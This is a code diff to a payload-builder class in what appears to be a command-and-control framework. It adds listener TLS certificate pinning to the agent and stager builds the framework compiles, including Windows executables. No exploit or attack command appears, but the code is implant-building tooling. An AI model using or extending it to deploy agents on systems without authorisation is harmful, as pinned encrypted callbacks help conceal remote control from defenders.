@@ -440,6 +440,11 @@ class PayloadBuilder:
             build_dir = self._artifact_dir / payload_id
             build_dir.mkdir(exist_ok=True)
 
+            tls_on, tls_cert_pem = self._tls_for_build()
+            if tls_on:
+                build_log.append(
+                    "Listener TLS: agent pins the listener certificate")
+
             artifact_path = build_dir / f"{payload_config.name}_{payload_config.platform.value}_{payload_config.arch.value}"
 
             # Handle STAGE delivery — generate small C stager stub
@@ -474,6 +479,8 @@ class PayloadBuilder:
                             modules=payload_config.stub_modules(),
                             platform=payload_config.platform.value,
                             arch=payload_config.arch.value,
+                            tls=tls_on,
+                            tls_cert_pem=tls_cert_pem,
                         )
                         pe_result = await pe_build.build(stub_cfg, artifact_path.with_suffix('.exe'))
                         if pe_result.status == "built":
@@ -505,6 +512,8 @@ class PayloadBuilder:
                         modules=payload_config.stub_modules(),
                         platform=payload_config.platform.value,
                         arch=payload_config.arch.value,
+                        tls=tls_on,
+                        tls_cert_pem=tls_cert_pem,
                     )
                     agent_code = stub_gen.generate(stub_cfg)
                     src_path = artifact_path.parent / f"{artifact_path.name}.py"
@@ -571,6 +580,21 @@ class PayloadBuilder:
         metadata.build_log = build_log
 
         return metadata
+
+    def _tls_for_build(self) -> Tuple[bool, str]:
+        """Whether the listener this payload will call speaks TLS, and which certificate.
+
+        Resolved from the same server.* config the transport manager reads, so a
+        payload cannot be baked with a pin its listener does not present. The
+        pair is generated on demand — building before the server has started must
+        produce the very certificate the server will later reuse.
+        """
+        from pupyteer.server.core.tls import listener_tls
+
+        material = listener_tls(self._config.get)
+        if material is None:
+            return False, ""
+        return True, material.cert_pem
 
     # PyInstaller and Nuitka both take a couple of minutes on a cold cache.
     _COMPILE_TIMEOUT_SECONDS = 900
